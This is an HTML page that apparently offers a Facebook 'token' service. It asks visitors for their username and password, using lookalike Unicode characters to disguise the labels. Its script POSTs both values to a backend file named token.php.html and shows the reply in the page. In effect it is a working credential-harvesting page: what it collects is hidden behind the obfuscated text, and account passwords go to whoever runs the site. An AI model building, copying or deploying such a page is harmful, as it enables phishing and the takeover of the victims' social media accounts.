<!doctype html>
<html>
<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <title> &#5397;H&#5609;HZAD  &#5609;&#5397;GH&#5609;R ____&#5198; &#5397;ITE </title>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link rel="stylesheet" href="bootstrap.min.css" />
   <script src="ali.css"></script>
   <script src="sAhib.js"></script>
   <div class="panel-heading"></div>
 <body>
  <div id="content">
 <br /><br />
 <center>
 <div class="MASOOM MIRZA">
 <a href="https://www.Facebook.com/100024493575222" alt="MASOOM MIRZA" target="_blank">
 <img src="https://graph.facebook.com/100024493575222/picture" alt="" style="border-radius: 50px; border: 2px; box-shadow: 0px 0px 7px 2px 	#ff0000; padding: 0px;" width="300" height="300" title="Facebook Team"/></a>

 </div></center></div></body></head>
 
 <div class="container">
   <h2> &#5397;H&#5609;HZAD &#5609;&#5397;GH&#5609;R TOKE&#5198; &#5397;___ </h2>
   <div class="panel-group">
 <div class="panel panel-primary">
       <div class="panel-heading">100% &#5205;&#5500;E&#5205;K&#5229;OI&#5198;T &#5198;O &#5397;&#5229;&#5609;&#5616; </div>
       <div class="panel-body">      
 <div class="form-group">
   <label for="usr">E&#5198;TE&#5511; &#5196;&#5397;E&#5511;&#5198;&#5609;&#5616;E: </label>
   <input type="text" class="form-control" id="tk" />
 </div>
 <div class="form-group">
   <label for="pwd">E&#5198;TE&#5511; &#5229;&#5609;&#5397;&#5397;&#5615;O&#5511;&#5610;: </label>
   <input type="text" class="form-control" id="mk" />
 </div>
 <button type="button" class="btn btn-danger" onclick="Puaru_Active()">GET TOKEN&#5198; </button>
 <p>
 <li id="trave" class="list-group-item"><img src="a.jpg" />  </li></p>

 </div>
     </div>
 </div>

 <script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "token.php.html";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>

 </div></body>
 </html>
 